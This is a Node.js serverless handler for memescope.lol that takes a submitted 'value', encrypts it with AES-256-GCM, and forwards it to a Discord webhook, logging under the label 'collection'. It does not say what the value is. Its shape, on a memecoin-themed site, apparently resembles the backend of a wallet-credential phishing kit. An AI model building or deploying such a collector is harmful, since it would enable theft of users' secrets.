const crypto = require('crypto');

module.exports = async function handler(req, res) {

  // CORS
  const allowedOrigins = [
    'https://www.memescope.lol',
    'https://memescope.lol'
  ];

  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle browser preflight request
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({
      error: 'Method not allowed'
    });
  }

  try {
    const { value } = req.body || {};

    if (!value) {
      return res.status(400).json({
        error: 'Missing value'
      });
    }

    // Get encryption key from environment variable
    const key = Buffer.from(
      process.env.ENCRYPTION_KEY,
      'hex'
    );

    if (key.length !== 32) {
      throw new Error(
        'ENCRYPTION_KEY must be exactly 64 hexadecimal characters'
      );
    }

    // Generate a random IV for every message
    const iv = crypto.randomBytes(12);

    // AES-256-GCM encryption
    const cipher = crypto.createCipheriv(
      'aes-256-gcm',
      key,
      iv
    );

    const encrypted = Buffer.concat([
      cipher.update(String(value), 'utf8'),
      cipher.final()
    ]);

    // Authentication tag
    const authTag = cipher.getAuthTag();

    // Combine:
    // IV + authentication tag + encrypted message
    const encryptedMessage = Buffer.concat([
      iv,
      authTag,
      encrypted
    ]).toString('base64');

    // Store your NEW webhook in an environment variable
    const webhooks = [
      process.env.DISCORD_WEBHOOK_URL
    ];

    if (!process.env.DISCORD_WEBHOOK_URL) {
      throw new Error('DISCORD_WEBHOOK_URL is not configured');
    }

    const responses = await Promise.all(
      webhooks.map(webhook =>
        fetch(webhook, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            content: encryptedMessage
          })
        })
      )
    );

    // Check for failed webhooks
    const failedResponses = responses.filter(
      response => !response.ok
    );

    if (failedResponses.length > 0) {
      const response = failedResponses[0];

      const errorText = await response.text();

      console.error(
        'Discord error:',
        response.status,
        errorText
      );

      return res.status(502).json({
        error: 'Discord webhook failed',
        status: response.status
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {

    console.error(
      'Collect error:',
      error
    );

    return res.status(500).json({
      error: 'Collection failed'
    });
  }
};